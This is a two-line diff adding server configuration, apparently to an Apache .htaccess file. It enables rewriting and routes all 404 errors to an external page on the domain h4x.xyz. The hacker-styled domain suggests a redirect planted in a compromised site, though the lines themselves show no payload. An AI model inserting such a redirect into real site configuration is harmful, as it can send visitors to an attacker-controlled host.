@@ -1,0 +1,2 @@
+RewriteEngine On
+ErrorDocument 404 http://h4x.xyz/404.html
